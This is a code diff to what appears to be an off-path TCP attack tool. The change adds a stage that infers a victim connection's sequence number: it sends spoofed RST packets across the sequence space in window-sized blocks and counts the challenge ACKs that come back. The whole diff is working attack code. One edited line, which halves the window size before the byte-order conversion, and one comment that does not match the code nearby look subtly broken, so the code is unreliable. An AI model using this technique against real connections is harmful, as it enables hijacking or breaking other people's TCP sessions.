@@ -382,6 +382,8 @@ int conduct_offpath_attack(void)
 	astate_t attack_state = AS_SYNC;
 	volatile conn_t *legit, *spoof;
 	uint16_t guess_start = 0, guess_end = 0, guess_mid = 0;
+	uint32_t seq_nblocks = UINT32_MAX / g_ctx.winsz;
+	uint32_t seq_block = 0, seq_last_block = 0;
 
 	legit = &(g_ctx.conn_legit);
 	spoof = &(g_ctx.conn_spoof);
@@ -633,6 +635,70 @@ int conduct_offpath_attack(void)
 			}
 
 			g_chack_cnt = 0;
+		}
+
+		else if (attack_state == AS_SEQ_INFERENCE) {
+			/*
+			 * try to determine the victim's current sequence number
+			 *
+			 * we do this using an optimized approach breaking the search space
+			 * into blocks based on the window size.
+			 */
+
+			/* remember which block we started with */
+			seq_last_block = seq_block;
+			do {
+				/* meh. we have to recalculate the TCP checksum to alter the source port */
+				spoof->seq = seq_block * g_ctx.winsz;
+				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
+					return 0;
+
+				/* limit the amount of time we try to send guesses */
+				gettimeofday(&now, NULL);
+				timersub(&now, &round_start, &diff);
+
+				seq_block++;
+				if (seq_block == seq_nblocks)
+					break;
+				if (seq_block - seq_last_block >= 50000)
+					break;
+			} while (diff.tv_usec < 500000);
+
+			printf("[*] seq-infer: spoofed %d RSTs in %lu %lu\n", (int)(seq_block - seq_last_block), diff.tv_sec, diff.tv_usec);
+
+			/* send 100 RSTs */
+			g_ctx.numpkts = 100;
+			while (g_ctx.numpkts > 0)
+				usleep(250);
+			gettimeofday(&now, NULL);
+			timersub(&now, &round_start, &diff);
+#ifdef DEBUG_SEND_TIME
+			printf("  entire send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
+#endif
+			if (diff.tv_sec > 0) {
+				fprintf(stderr, "[!] OH NO! sending took too long!\n");
+				return 0;
+			}
+
+			/* get the number of challenge ACKs after 1 second */
+			do {
+				usleep(250);
+				gettimeofday(&now, NULL);
+				timersub(&now, &round_start, &diff);
+			} while (diff.tv_sec < 1);
+#ifdef DEBUG_RECV_TIME
+			printf("  recv took %lu %lu\n", diff.tv_sec, diff.tv_usec);
+#endif
+
+			printf("[*] seq-infer: guessed seqs [%lu - %lu): %3d challenge ACKs - %s\n",
+					(u_long)seq_last_block * g_ctx.winsz, (u_long)seq_block * g_ctx.winsz,
+					g_chack_cnt, g_chack_cnt == 100 ? "NO" : "OK");
+
+			g_chack_cnt = 0;
+
+			/* did we finish? */
+			if (seq_block == seq_nblocks)
+				break;
 		}
 	}
 
@@ -1012,7 +1078,7 @@ int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, uint32_t
 	}
 	ptcp = (struct tcphdr *)ptr;
 	if (!g_ctx.winsz) {
-		g_ctx.winsz = ntohs(ptcp->th_win);
+		g_ctx.winsz = ntohs(ptcp->th_win / 2);
 		printf("[*] TCP Window size: %u\n", g_ctx.winsz);
 	}
 	tcplen = ptcp->th_off * 4;
